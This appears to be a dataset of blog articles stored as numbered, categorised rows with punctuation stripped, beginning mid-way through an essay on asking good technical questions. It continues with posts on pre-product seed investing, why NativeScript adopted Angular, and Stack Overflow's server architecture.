 didn t feel like the right question though   I understood more or less how the code worked  but I didn t understand why they wrote the code that way  So I wrote this question to the rkt dev mailing list  Why does rkt store container images differently from Docker    I  wrote down my understanding of how both rkt and Docker store containers on disk  came up with a few reasons I thought they might have designed it the way they did  and just asked  is my understanding right    The answer I got was super super helpful  exactly what I was looking for  It took me quite a while to formulate the question in a way that I was happy with  and I m happy I took the time because it made me understand what was happening a lot better   Stating your understanding is not at all easy  it takes time to think about what you know and clarify your thoughts    but it works really well and it makes it a lot easier for the person you re asking to help you   Ask questions where the answer is a fact  A lot of the questions I have start out kind of vague  like  How do SQL joins work    That question isn t awesome  because there are a lot of different parts of how joins work  How is the person even supposed to know what I m interested in learning   I like to ask questions where the answer is a straightforward fact  For example  in our SQL joins example  some questions with facts for answers might be   What s the time complexity of joining two tables of size N and M  Is it O NM   O NlogN    O MlogM    Does MySQL always sort the join columns as a first step before doing the join   I know that Hadoop sometimes does a  hash join    is that a joining strategy that other database engines use too   When I do a join between one indexed column and one unindexed column  do I need to sort the unindexed column   When I ask super specific questions like this  the person I m asking doesn t always know the answer  which is fine    but at least they understand the kind of question I m interested in   like  I m obviously not interested in knowing how to use a join  I want to understand something about the implementation details and the algorithms   Be willing to say what you don t understand  Often when someone is explaining something to me  they ll say something that I don t understand  For example  someone might be explaining something about databases to me and say  well  we use optimistic locking with MySQL  and so    I have no idea what  optimistic locking  is  So that would be a good time to ask      Being able to stop someone and say  hey  what does that mean   is a super important skill  I think of it as being one of the properties of a confident engineer and an awesome thing to grow into  I see a lot of senior engineers who frequently ask for clarifications   I think when you re more confident in your skills  this gets easier   The more I do this  the more comfortable I feel asking someone to clarify  in fact  if someone doesn t ask me for clarifications when I m explaining something  I worry that they re not really listening   This also creates space for the question answerer to admit when they ve reached the end of their knowledge  Very frequently when I m asking someone questions  I ll ask something that they don t know  People I ask are usually really good at saying  nope  I don t know that    Identify terms you don t understand  When I started at my current job  I started on the data team  When I started looking at what my new job entailed  there were all these words  Hadoop  Scalding  Hive  Impala  HDFS  zoolander  and more  I had maybe heard of Hadoop before but I didn t know what basically any of these words meant  Some of the words were internal projects  some of them were open source projects  So I started just by asking people to help me understand what each of the terms meant and the relationships between them  Some kinds of questions I might have asked   Is HDFS a database   no  it s a distributed file system   Does Scalding use Hadoop   yes   Does Hive use Scalding   no   I actually wrote a  dictionary  of all the terms because there were so many of them  and understanding what all the terms meant really helped me orient myself and ask better questions later on   Do some research  When I was typing up those SQL questions above  I typed  how are sql joins implemented  into Google  I clicked some links  saw  oh  I see  sometimes there is sorting  sometimes there are hash joins  I ve heard about those   and then wrote down some more specific questions I had  Googling a little first helped me write slightly better questions   That said  I think people sometimes harp too much on  never ask a question without Googling it first    sometimes I ll be at lunch with someone and I ll be curious about their work  and I ll ask them some kind of basic questions about it  This is totally fine   But doing research is really useful  and it s actually really fun to be able to do enough research to come up with a set of awesome questions   Decide who to ask  I m mostly talking here about asking your coworkers questions  since that s where I spend most of my time   Some calculations I try to make when asking my coworkers questions are   is this a good time for this person   if they re in the middle of a stressful thing  probably not   for this person   if they re in the middle of a stressful thing  probably not  will asking them this question save me as much time as it takes them   if I can ask a question that takes them 5 minutes to answer  and will save me 2 hours  that s excellent  D   How much time will it take them to answer my questions  If I have half an hour of questions to ask  I might want to schedule a block of time with them later  if I just have one quick question I can probably just ask it right now   to answer my questions  If I have half an hour of questions to ask  I might want to schedule a block of time with them later  if I just have one quick question I can probably just ask it right now  Is this person too senior for this question  I think it s kind of easy to fall into the trap of asking the most experienced   knowledgeable person every question you have about a topic  But it s often actually better to find someone who s a little less knowledgeable   often they can actually answer most of your questions  it spreads the load around  and they get to showcase their knowledge  which is awesome    I don t always get this right  but it s been helpful for me to think about these things   Also  I usually spend more time asking people who I m closer to questions   there are people who I talk to almost every day  and I can generally ask them questions easily because they have a lot of context about what I m working on and can easily give me a helpful answer   How to ask questions the smart way by ESR is a popular and pretty hostile document  it starts out poorly with statements like  We call people like this  losers     It s about asking questions to strangers on the internet  Asking strangers on the internet questions is a super useful skill and can get you really useful information  but it s also the  hard mode  of asking questions  The person you re talking to knows very little about your situation  so it helps to be proportionally more careful about stating what exactly you want to know  I don t like ESR s document at all but it has some useful things to say  The  How To Answer Questions in a Helpful Way  section is actually really excellent   Ask questions to show what s not obvious  A more advanced form of question asking is asking questions to reveal hidden assumptions or knowledge  This kind of question actually has two purposes   first  to get the answers  there is probably information one person has that other people don t   but also to point out that there is some hidden information  and that sharing it is useful   The  The Art of Asking Questions  section of the Etsy s Debriefing Facilitation Guide is a really excellent introduction to this  in the context of discussing an incident that has happened  Here are a few of the questions from that guide    What things do you look for when you suspect this type of failure happened    How did you judge that this situation was  normal   How did you know that the database was down  How did you know that was the team you needed to page   These kinds of questions  that seem pretty basic  but are not actually obvious  are especially powerful when someone who s in a position of some authority asks them  I really like it when a manager   senior engineer asks a basic but important question like  how did you know the database was down   because it creates space for less senior people to ask the same kinds of questions later   Answer questions   One of my favorite parts of Andr  Arko s great How to Contribute to Open Source post is where he says  Now that you ve read all the issues and pull requests  start to watch for questions that you can answer  It won t take too long before you notice that someone is asking a question that s been answered before  or that s answered in the docs that you just read  Answer the questions you know how to answer   If you re ramping up on a new project  answering questions from people who are learning the stuff you just learned can be a really awesome way to solidify your knowledge  Whenever I answer a question about a new topic for the first time I always feel like  omg  what if I answer their question wrong  omg   But usually I can answer their question correctly  and then I come away feeling awesome and like I understand the subject better   Questions can be a huge contribution  Good questions can be a great contribution to a community  I asked a bunch of questions about CDNs a while back on twitter and wrote up the answers in CDNs aren t just for caching  A lot of people told me they really liked that blog post  and I think that me asking those questions helped a lot of people  not just me   A lot of people really like answering questions  I think it s important to think of good questions as an awesome thing that you can do to add to the conversation  not just  ask good questions so that people are only a little annoyed instead of VERY annoyed  
19,business,How I Think About Pre Product Seed Investments   Startup Traction  by NextView    MediumHow I Think About Pre Product Seed Investments  A big chunk of our investments at NextView have been made pre product  We have a bias towards very early stage investing for a bunch of reasons  but it s not easy  It s often a good idea for founders to find a way to build something and get some early market validation before raising outside capital  But doing that is sometimes not practical given your personal runway or because the product you want to build requires additional capital very early on   So  how do you go about raising money for a company pre product  And how does an investor think about a pre product opportunity  I think this stage  more than others  is very dependent on the individual investor  But here s how I tend to think about companies at this stage  which I think is broad enough to provide some guidance for founders at this early stage   Essentially  my pre product framework is as follows   1  Is there founder market fit   How authentic is this idea to the founder s experience   Does the founding team have off the charts horsepower   Does the founding team exhibit specific superpowers that are uniquely well suited to the biggest immediate challenges of the business   2  How far is the company from product market fit   What evidence do we have that their proposed product will be close to product market fit  PMF    How quickly and expensively will it take to test PMF   3  If the company gets to PMF  will it matter   How fast can this grow post PMF and what risks are associated with this growth   Is the opportunity big  attractive  etc   I ll dig into this a bit further   Founder Market Fit  We tend to believe that the best companies are born out of authentic experiences   so much so that this is how we define our investment areas of focus  My partner David has also written about this a bunch  In short  I find that authenticity helps a founder more quickly find product market fit  recruit and inspire teams  and resonate more deeply with customers  All really important things   Starting a company is hard  It takes a certain level of raw horsepower to create something out of nothing and then lead a company from early product market fit to scale  We have a very  very strong preference to work with founders who will lead a company through all stages of growth  and so we place a pretty heavy emphasis on the raw horsepower of the founder   both their raw intelligence as well as their strength of will and emotional fortitude   In addition to raw horsepower  a big part of founder market fit is whether the strengths of the founding team line up well with the challenges of the business  especially in the early days  We ve seen companies with very strong founders struggle when there is a mismatch between their strengths and the business they are building  Just like you don t want a marathon runner to compete in a 100 meter race or a great ping pong player representing you in a boxing match  great teams tend to be great in the context where their strengths can really shine   For these two aspects of founder market fit  we rely very heavily on references to get to the bottom of this  Another very strong signal is the quality of the people one is able to surround themselves with  Surrounding yourself with extraordinary people is both a signal of great raw horsepower as well as being the one superpower that matters most for almost any company   This notion of founder market fit is incredibly important for pre product companies who are out raising seed capital or pre seed  aka genesis rounds    both of which we invest in  But there s also a great deal of importance placed on another  more common idea   Product Market Fit  When a company is pre product  it is by definition pre product market fit  But typically  I want to have some sense that the direction they are headed is in the general vicinity of good PMF  We could certainly be wrong   and great companies are often born out of pivots or restarts   but to be a good high conviction  hands on investor  I want to at least be a true believer early on  This is why I m not a fan of investing based on a space and a team and believing they ll  figure something out   I think that taking money at that point in a company s life isn t a great idea either   Even before a company has launched a product  there are ways to show some evidence for potential early PMF  We talk a lot about this in our podcast Traction  particularly in these episodes about NatureBox and InsightSquared  I m also a fan of replicating a service through human intervention to try to uncover some early data points  One of our portfolio companies Scratch first tested their buying concierge concept by replicating the service strictly through email and humans on the back end  It wasn t really  the product  but they were able to get a sense for the breadth of requests they would get and the willingness of a small number of consumers to transact through a shopping assistant  On top of this  I just love companies that take a very methodical approach towards customer discovery in order to get to the heart of users  needs and thought process   If you re interested in learning more  I lay out some thoughts about this and other helpful resources for avoiding pitfalls and executing best practices for startup customer development in this post    The other consideration around PMF is the cost and time that will be required to really show demonstrable PMF  For many software products  this can happen relatively quickly  But for other types of businesses  this can take a lot more time and or money  This is true to some degree for hardware products  some types of enterprise facing software products  and some consumer products as well  As a firm  we build a portfolio of companies  so we can tolerate a handful of companies that require more time and capital to get to market  But I ve found that even if this is the case  if a team is pushed to find ways to show market validation earlier  they find that they can shave a bunch of months off their timeline and end up learning a lot more than they ever expected in the process  As result  we tend to be impressed with teams that have a plan to get to market surprisingly quickly with a scaled down version of their ultimate product  as opposed to teams that plan to work in the dark a long time before one big reveal   Will It Matter   Some investors tend of think of go to market speed or adoption speed first  and I used to be in this camp  But I ve learned to save this for later in my process  because often the potential of a product is hard to appreciate at first blush  But assuming a company is intriguing based on the first two sets of questions above  I then ask myself   If everything goes right and you demonstrate great product market fit  so what    One dimension that I think about more today is the speed of scale  If everything goes right and you get to PMF  can this company step on the gas and exhibit hyper growthonce they ve achieved product market fit  And what risks will be associated with scaling at that point   For example  the risk of SaaS or subscription based companies is that  1  they tend to consume cash to grow since your customer acquisition costs are recovered over time  not up front  and  2  companies may need to push hard on scaling before they really know how robust their customer LTV will be over time  For companies that require a geographic rollout  the risks are different  Once you ve shown what PMF looks like in one market  lots of competitors will replicate you in other markets  so you need to raise lots of money to get there first and launch many markets in quick succession   None of these are inherently bad  but I want to think about these dynamics and what this means for future financing of the business before making an investment decision   Finally  I think about the classic questions of   Is this a big market   and   Is this a good market    So  these are the areas that I tend to think about  The first  founder market fit  and the third  implications once PMF is achieved  are relatively straightforward to talk about pre product  But the second is trickier   how far is the company from PMF at its current  pre product stage  If I m a founder of a pre product company raising a pre seed or seed round  I m thinking about all three things  building a strong case for each  and drilling more deeply into the second  But in the end  as we like to say  this process is all about finding the true believers 
20,engineering,We Have Seriously Underestimated Angular  Telerik Developer NetworkI was putting together the keynote for the upcoming NativeScript Developer Day conference  and I had a slide placeholder in to talk about Angular  NativeScript has supported Angular 2 since it was released in RC at ng conf in May  You can check out our quick 2 minute segment of the keynote where we announced our support   As I was putting together the slides  I thought   What exactly am i going to say about Angular   Hasn t everything already been said  Like 20 times  Instead  I started doing some research into exactly why we chose Angular 2 for NativeScript to begin with   I always thought that it was based off of an email that Brad sent me in February 2015   At that time  NativeScript was already at beta and headed for a full release  May 2015   We had our own binding framework  as well as full support for TypeScript and ES6  I remember thinking   what exactly do we need Angular for    Angular 2 looks complicated  they seem to re write it every 2 weeks and it feels like an uneccessasry tax to pay on JavaScript   I  like so many other people  seriously underestimated Angular   There have been so many articles on React  Angular  blood  guts  and how all JavaScript frameworks are more or less killing us slowly like too much Taco Bell  which  btw  is super unfair because Taco Bell has done a lot to improve the quality of it s food lately   Man  is it easy to just completely drown in the noise  We also tend to forget why we even made certain decisions in the first place  I m not sure how anyone ships anything anymore   I got caught up in this nonsense myself  As it turns out  there are really good reasons why we chose Angular for NativeScript  We could have chosen React  Aurelia  an excellent framework right there  or any number of others  I mean  we could have fully implemented jQuery for NativeScript if we wanted to   But we didn t  We went with Angular  And the reasons why are far bigger than you would expect  Starting with the fact that nobody fully understands the adoption Angular enjoys   Angular Adoption  We knew that we needed to provide an application framework for NativeScript  We still have our own binding solution and vanilla JavaScript model that many developers love  but a great many more need more from NativeScript than just  go nuts with JavaScript   That s where Angular comes in   I don t think anyone would argue that Angular is popular  I just think that nobody really understands how popular it is  Consider this scoped Google Trends graph   When you look at this strictly from the angle of what people are searching for  Angular has nearly twice the adoption of the next highest  I didn t even include any others besides React in the comparison because they are so slight that they are all essentially flat lines on the graph when put up against the behemoths that are jQuery  Angular and React  React is definitely a juggernaut  but it is still half of what Angular is in terms of interest on Google search  Furthermore  at the current pace  Angular will be more popular than jQuery in terms of Google searches by the end of 2017  Let me repeat that in case you didn t fully catch it   Angular will soon be more popular than jQuery   1 3 million people use Angular 1   480k already use Angular 2    David East   _davideast  September 15  2016  That should blow your mind  None of the hype that we hear on a day to day basis would suggest that this is the case  but it is  Don t like my Google trends  OK  let s do another  How about StackOverflow   While the recent 2016 developer survey from StackOverflow shows that React is the trendiest topic  if you look at the tags page  Angular is number 20 down the list with 250 questions asked just today and 1615 this week   React is on page 6 right before the oddly specific  visual studio 2012  tag  with 82 questions asked today and 515 so far this month  That s roughly 1 3 the amount of Angular  This is not a slam on React  React is on a ridiculous upwards trajectory  I m simply trying to point out what real mass adoption looks like   Now I ll be the first to admit that StackOverflow is a certain subset of developers  like the fact that their own survey reports that 4 of the top 10 tech stacks per occupation include either C  or SQL Server  roughly 78   which would indicate that these are primarily enterprise and line of business developers  But who do you think is out there writing 90  of the software everyday  It s line of business developers  not startups in San Francisco  As a side note  guess which other technology shows up in the top 10 tech stacks by occupation  I ll give you a hint  it starts with  A  and ends with  ngular    I m saying all of this to point out that the reason why we selected Angular was in large part based on it s sheer adoption numbers  How do you know when a technology isn t going anywhere anytime soon  When 2 of the top 10 tech stacks by occupation name it specifically instead of just lumping it under  JavaScript   The fine folks on the React Native team nailed this when they said   Learn once  write anywhere   That s exactly right  Why should you have to learn our binding  templating and application patterns when you already know Angular  You shouldn t  That s how people get worn out and fed up with programming  and rightfully so    But Burke  These stats are all Angular 1  Angular 2 is way different and everyone hates it    Good point  You re sharp  That s a fair concern  but also another huge underestimation  Mostly because Angular 1 is Angular 2   Angular 1 Is Angular 2  I didn t realize this until Todd Motto pointed it out to me  but the Angular team has been moving 1 x towards 2 0  If you haven t looked at Angular 1 x in a while  you might not even recognize it  Consider the following simple application component module in Angular 1 x   const AppComponent     template     h1 Root Component  h1       angular  module  app        component  app   AppComponent    Now here is that same thing as a component in Angular 2    import  Component  from   angular core    Component   selector   app   template     h1 Root Component  h1       export class AppComponent     They look ridiculously similar  Aside from some of the newer additions such as the  Component annotation and leveraging an actual module standard  they are virtually identical  Everyone has this idea in their head that Angular 2 and Angular 1 are drastically different  They are  but the team has been very sneaky in the way that they have merged the API of Angular 1 into Angular 2  The leap from one to the other is significantly shorter than anyone thinks   There is also this notion that people don t like Angular 2  That s just simply not the case  Angular 2 has been the most unstable JavaScript framework ever   by an enormous margin  The team over at Google ships breaking changes almost once a month  And yet  look at the State Of JavaScript survey that came out recently which reports that 64  of people are happy with their Angular 2 development experience  What    That s crazy  This is like 64  of people being pleased with a car that consistently leaves them stranded  Imagine how much higher this number will be now that Angular 2 Final has been released   Lastly  there s something here that we haven t even considered yet that causes people to intrinsically want to move to Angular 2 over any other framework out there  and that s TypeScript   TypeScript  TypeScript has been the subject of a lot of consternation for web developers  Why do we need types in JavaScript  What in the name of everything that is holy do interfaces possibly bring to the table for JavaScript developers besides bloat  Why are we trying to complicate something that is so simple to use  Keep your stupid OOP concepts  They aren t welcome in our browsers   The trouble is  those concepts that JavaScript so elegantly eschews are the same ones that are the foundation of solid applications  You know that age old argument about how JavaScript isn t suitable for large applications  That s because large applications require interfaces  some healthy amount of inheritance  gasp  I know  and the myriad of other structures that typed languages enjoy  and yes  modules   Those things were put into languages by really smart people for a reason  Not so that we could just throw them all out in favor of a language that was created in 10 days   There are a lot of developers out there with solid OOP backgrounds in C  and Java that have no interest in just ditching decades of hard learned programming experience  For them  TypeScript opens up the door to a whole world of application development that they otherwise would have little to no interest in  This means that when these developers go looking for a framework to build their TypeScript apps with  they will end up in Angular s front yard like John Cusack in Say Anything   I m sure you already know that Angular 2 is built on and for TypeScript  and so is NativeScript  What you may not know  is that other JavaScript frameworks such as Aurelia  Ember and even Dojo are headed towards TypeScript as well  Regardless of your opinion on TypeScript  it is a phenomenon that is sweeping through the JavaScript community  and it is pulling millions of developers into JavaScript along with it   Be Skeptical But Watch Closely  Nobody can predict the future  And just because this blog post is on the internet does not make it true  If anything  it should make you very skeptical  But skeptical you should be  I m simply suggesting that none of us fully grasp the enormity of Angular and the crushing influence that it has  even if they did decide to re write it from scratch and break everything on the daily   In the end  Angular is far bigger than any of us realize and 2 0 has some aggressive aspirations to be far bigger than just the web  NativeScript is part of that realization  but I don t think we ve seen anything yet   Header image courtesy of Marc Majcher
21,engineering,Stack Overflow  The ArchitectureTo get an idea of what all of this stuff  does   let me start off with an update on the average day at Stack Overflow  So you can compare to the previous numbers from November 2013  here s a day of statistics from February 9th  2016 with differences since November 12th  2013   209 420 973   61 336 090  HTTP requests to our load balancer  HTTP requests to our load balancer 66 294 789   30 199 477  of those were page loads  of those were page loads 1 240 266 346 053   406 273 363 426  bytes  1 24 TB  of HTTP traffic sent  bytes  1 24 TB  of HTTP traffic sent 569 449 470 023   282 874 825 991  bytes  569 GB  total received  bytes  569 GB  total received 3 084 303 599 266   1 958 311 041 954  bytes  3 08 TB  total sent  bytes  3 08 TB  total sent 504 816 843   170 244 740  SQL Queries  from HTTP requests alone   SQL Queries  from HTTP requests alone  5 831 683 114   5 418 818 063  Redis hits  Redis hits 17 158 874  not tracked in 2013  Elastic searches  Elastic searches 3 661 134   57 716  Tag Engine requests  Tag Engine requests 607 073 066   48 848 481  ms  168 hours  spent running SQL queries  ms  168 hours  spent running SQL queries 10 396 073   88 950 843  ms  2 8 hours  spent on Redis hits  ms  2 8 hours  spent on Redis hits 147 018 571   14 634 512  ms  40 8 hours  spent on Tag Engine requests  ms  40 8 hours  spent on Tag Engine requests 1 609 944 301   1 118 232 744  ms  447 hours  spent processing in ASP Net  ms  447 hours  spent processing in ASP Net 22 71   5 29  ms average  19 12 ms in ASP Net  for 49 180 275 question page renders  ms average  19 12 ms in ASP Net  for 49 180 275 question page renders 11 80   53 2  ms average  8 81 ms in ASP Net  for 6 370 076 home page renders  You may be wondering about the drastic ASP Net reduction in processing time compared to 2013  which was 757 hours  despite 61 million more requests a day  That s due to both a hardware upgrade in early 2015 as well as a lot of performance tuning inside the applications themselves  Please don t forget  performance is still a feature  If you re curious about more hardware specifics than I m about to provide fear not  The next post will be an appendix with detailed hardware specs for all of the servers that run the sites  I ll update this with a link when it s live    So what s changed in the last 2 years  Besides replacing some servers and network gear  not much  Here s a top level list of hardware that runs the sites today  noting what s different since 2013    4 Microsoft SQL Servers  new hardware for 2 of them   11 IIS Web Servers  new hardware   2 Redis Servers  new hardware   3 Tag Engine servers  new hardware for 2 of the 3   3 Elasticsearch servers  same   4 HAProxy Load Balancers  added 2 to support CloudFlare   2 Networks  each a Nexus 5596 Core   2232TM Fabric Extenders  upgraded to 10Gbps everywhere   2 Fortinet 800C Firewalls  replaced Cisco 5525 X ASAs   2 Cisco ASR 1001 Routers  replaced Cisco 3945 Routers   2 Cisco ASR 1001 x Routers  new    What do we need to run Stack Overflow  That hasn t changed much since 2013  but due to the optimizations and new hardware mentioned above  we re down to needing only 1 web server  We have unintentionally tested this  successfully  a few times  To be clear  I m saying it works  I m not saying it s a good idea  It s fun though  every time   Now that we have some baseline numbers for an idea of scale  let s see how we make those fancy web pages  Since few systems exist in complete isolation  and ours is no exception   architecture decisions often make far less sense without a bigger picture of how those pieces fit into the whole  That s the goal here  to cover the big picture  Many subsequent posts will do deep dives into specific areas  This will be a logistical overview with hardware highlights only  the next post will have the hardware details   For those of you here to see what the hardware looks like these days  here are a few pictures I took of rack A  it has a matching sister rack B  during our February 2015 upgrade    and if you re into that kind of thing  here s the entire 256 image album from that week  you re damn right that number s intentional   Now  let s dig into layout  Here s a logical overview of the major systems in play   Ground Rules  Here are some rules that apply globally so I don t have to repeat them with every setup   Everything is redundant   All servers and network gear have at least 2x 10Gbps connectivity   All servers have 2 power feeds via 2 power supplies from 2 UPS units backed by 2 generators and 2 utility feeds   All servers have a redundant partner between rack A and B   All servers and services are doubly redundant via another data center  Colorado   though I m mostly talking about New York here   Everything is redundant   The Internets  First you have to find us that s DNS  Finding us needs to be fast  so we farm this out to CloudFlare  currently  because they have DNS servers nearer to almost everyone around the world  We update our DNS records via an API and they do the  hosting  of DNS  But since we re jerks with deeply rooted trust issues  we still have our own DNS servers as well  Should the apocalypse happen  probably caused by the GPL  Punyon  or caching  and people still want to program to take their mind off of it  we ll flip them on   After you find our secret hideout  HTTP traffic comes from one of our four ISPs  Level 3  Zayo  Cogent  and Lightower in New York  and flows through one of our four edge routers  We peer with our ISPs using BGP  fairly standard  in order to control the flow of traffic and provide several avenues for traffic to reach us most efficiently  These ASR 1001 and ASR 1001 X routers are in 2 pairs  each servicing 2 ISPs in active active fashion so we re redundant here  Though they re all on the same physical 10Gbps network  external traffic is in separate isolated external VLANs which the load balancers are connected to as well  After flowing through the routers  you re headed for a load balancer   I suppose this may be a good time to mention we have a 10Gbps MPLS between our 2 data centers  but it is not directly involved in serving the sites  We use this for data replication and quick recovery in the cases where we need a burst   But Nick  that s not redundant   Well  you re technically correct  the best kind of correct   that s a single point of failure on its face  But wait  We maintain 2 more failover OSPF routes  the MPLS is  1  these are  2 and 3 by cost  via our ISPs  Each of the sets mentioned earlier connects to the corresponding set in Colorado  and they load balance traffic between in the failover situation  We could make both sets connect to both sets and have 4 paths but  well  whatever  Moving on   Load Balancers  HAProxy   The load balancers are running HAProxy 1 5 15 on CentOS 7  our preferred flavor of Linux  TLS  SSL  traffic is also terminated in HAProxy  We ll be looking hard at HAProxy 1 7 soon for HTTP 2 support   Unlike all other servers with a dual 10Gbps LACP network link  each load balancer has 2 pairs of 10Gbps  one for the external network and one for the DMZ  These boxes run 64GB or more of memory to more efficiently handle SSL negotiation  When we can cache more TLS sessions in memory for reuse  there s less to recompute on subsequent connections to the same client  This means we can resume sessions both faster and cheaper  Given that RAM is pretty cheap dollar wise  it s an easy choice   The load balancers themselves are a pretty simple setup  We listen to different sites on various IPs  mostly for certificate concerns and DNS management  and route to various backends based mostly on the host header  The only things of note we do here is rate limiting and some header captures  sent from our web tier  into the HAProxy syslog message so we can record performance metrics for every single request  We ll cover that later too   Web Tier  IIS 8 5  ASP Net MVC 5 2 3  and  Net 4 6 1   The load balancers feed traffic to 9 servers we refer to as  primary   01 09  and 2  dev meta   10 11  our staging environment  web servers  The primary servers run things like Stack Overflow  Careers  and all Stack Exchange sites except meta stackoverflow com and meta stackexchange com  which run on the last 2 servers  The primary Q A Application itself is multi tenant  This means that a single application serves the requests for all Q A sites  Put another way  we can run the entire Q A network off of a single application pool on a single server  Other applications like Careers  API v2  Mobile API  etc  are separate  Here s what the primary and dev tiers look like in IIS   Here s what Stack Overflow s distribution across the web tier looks like in Opserver  our internal monitoring dashboard     and here s what those web servers look like from a utilization perspective   I ll go into why we re so overprovisioned in future posts  but the highlight items are  rolling builds  headroom  and redundancy   Service Tier  IIS  ASP Net MVC 5 2 3   Net 4 6 1  and HTTP SYS   Behind those web servers is the very similar  service tier   It s also running IIS 8 5 on Windows 2012R2  This tier runs internal services to support the production web tier and other internal systems  The two big players here are  Stack Server  which runs the tag engine and is based on http sys  not behind IIS  and the Providence API  IIS based   Fun fact  I have to set affinity on each of these 2 processes to land on separate sockets because Stack Server just steamrolls the L2 and L3 cache when refreshing question lists on a 2 minute interval   These service boxes do heavy lifting with the tag engine and backend APIs where we need redundancy  but not 9x redundancy  For example  loading all of the posts and their tags that change every n minutes from the database  currently 2  isn t that cheap  We don t want to do that load 9 times on the web tier  3 times is enough and gives us enough safety  We also configure these boxes differently on the hardware side to be better optimized for the different computational load characteristics of the tag engine and elastic indexing jobs  which also run here   The  tag engine  is a relatively complicated topic in itself and will be a dedicated post  The basics are  when you visit  questions tagged java   you re hitting the tag engine to see which questions match  It does all of our tag matching outside of  search   so the new navigation  etc  are all using this service for data   Cache   Pub Sub  Redis   We use Redis for a few things here and it s rock solid  Despite doing about 160 billion ops a month  every instance is below 2  CPU  Usually much lower   We have a L1 L2 cache system with Redis   L1  is HTTP Cache on the web servers or whatever application is in play   L2  is falling back to Redis and fetching the value out  Our values are stored in the Protobuf format  via protobuf dot net by Marc Gravell  For a client  we re using StackExchange Redis written in house and open source  When one web server gets a cache miss in both L1 and L2  it fetches the value from source  a database query  API call  etc   and puts the result in both local cache and Redis  The next server wanting the value may miss L1  but would find the value in L2 Redis  saving a database query or API call   We also run many Q A sites  so each site has its own L1 L2 caching  by key prefix in L1 and by database ID in L2 Redis  We ll go deeper on this in a future post   Alongside the 2 main Redis servers  master slave  that run all the site instances  we also have a machine learning instance slaved across 2 more dedicated servers  due to memory   This is used for recommending questions on the home page  better matching to jobs  etc  It s a platform called Providence  covered by Kevin Montrose here   The main Redis servers have 256GB of RAM  about 90GB in use  and the Providence servers have 384GB of RAM  about 125GB in use    Redis isn t just for cache though  it also has a publish   subscriber mechanism where one server can publish a message and all other subscribers receive it including downstream clients on Redis slaves  We use this mechanism to clear L1 caches on other servers when one web server does a removal for consistency  but there s another great use  websockets   Websockets  NetGain   We use websockets to push real time updates to users such as notifications in the top bar  vote counts  new nav counts  new answers and comments  and a few other bits   The socket servers themselves are using raw sockets running on the web tier  It s a very thin application on top of our open source library  StackExchange NetGain   During peak  we have about 500 000 concurrent websocket connections open  That s a lot of browsers  Fun fact  some of those browsers have been open for over 18 months  We re not sure why  Someone should go check if those developers are still alive  Here s what this week s concurrent websocket pattern looks like   Why websockets  They re tremendously more efficient than polling at our scale  We can simply push more data with fewer resources this way  while being more instant to the user  They re not without issues though ephemeral port and file handle exhaustion on the load balancer are fun issues we ll cover later   Search  Elasticsearch   Spoiler  there s not a lot to get excited about here  The web tier is doing pretty vanilla searches against Elasticsearch 1 4  using the very slim high performance StackExchange Elastic client  Unlike most things  we have no plans to open source this simply because it only exposes a very slim subset of the API we use  I strongly believe releasing it would do more harm than good with developer confusion  We re using elastic for  search   calculating related questions  and suggestions when asking a question   Each Elastic cluster  there s one in each data center  has 3 nodes  and each site has its own index  Careers has an additional few indexes  What makes our setup a little non standard in the elastic world  our 3 server clusters are a bit beefier than average with all SSD storage  192GB of RAM  and dual 10Gbps network each   The same application domains  yeah  we re screwed with  Net Core here   in Stack Server that host the tag engine also continually index items in Elasticsearch  We do some simple tricks here such as ROWVERSION in SQL Server  the data source  compared against a  last position  document in Elastic  Since it behaves like a sequence  we can simply grab and index any items that have changed since the last pass   The main reason we re on Elasticsearch instead of something like SQL full text search is scalability and better allocation of money  SQL CPUs are comparatively very expensive  Elastic is cheap and has far more features these days  Why not Solr  We want to search across the entire network  many indexes at once   and this wasn t supported at decision time  The reason we re not on 2 x yet is a major change to  types  means we need to reindex everything to upgrade  I just don t have enough time to make the needed changes and migration plan yet   Databases  SQL Server   We re using SQL Server as our single source of truth  All data in Elastic and Redis comes from SQL Server  We run 2 SQL Server clusters with AlwaysOn Availability Groups  Each of these clusters has 1 master  taking almost all of the load  and 1 replica in New York  Additionally  they have 1 replica in Colorado  our DR data center   All replicas are asynchronous   The first cluster is a set of Dell R720xd servers  each with 384GB of RAM  4TB of PCIe SSD space  and 2x 12 cores  It hosts the Stack Overflow  Sites  bad name  I ll explain later   PRIZM  and Mobile databases   The second cluster is a set of Dell R730xd servers  each with 768GB of RAM  6TB of PCIe SSD space  and 2x 8 cores  This cluster runs everything else  That list includes Careers  Open ID  Chat  our Exception log  and every other Q A site  e g  Super User  Server Fault  etc     CPU utilization on the database tier is something we like to keep very low  but it s actually a little high at the moment due to some plan cache issues we re addressing  As of right now  NY SQL02 and 04 are masters  01 and 03 are replicas we just restarted today during some SSD upgrades  Here s what the past 24 hours looks like   Our usage of SQL is pretty simple  Simple is fast  Though some queries can be crazy  our interaction with SQL itself is fairly vanilla  We have some legacy Linq2Sql  but all new development is using Dapper  our open source Micro ORM using POCOs  Let me put this another way  Stack Overflow has only 1 stored procedure in the database and I intend to move that last vestige into code   Libraries  Okay let s change gears to something that can more directly help you  I ve mentioned a few of these up above  but I ll provide a list here of many open source  Net libraries we maintain for the world to use  We open sourced them because they have no core business value but can help the world of developers  I hope you find these useful today   Dapper   Net Core    High performance Micro ORM for ADO Net  StackExchange Redis   High performance Redis client  MiniProfiler   Lightweight profiler we run on every page  also supports Ruby  Go  and Node   Exceptional   Error logger for SQL  JSON  MySQL  etc   Jil   High performance JSON  de serializer  Sigil   A  Net CIL generation helper  for when C  isn t fast enough   NetGain   High performance websocket server  Opserver   Monitoring dashboard polling most systems directly and feeding from Orion  Bosun  or WMI as well   Bosun   Backend monitoring system  written in Go  Next up is a detailed current hardware list of what runs our code  After that  we go down the list  Stay tuned 
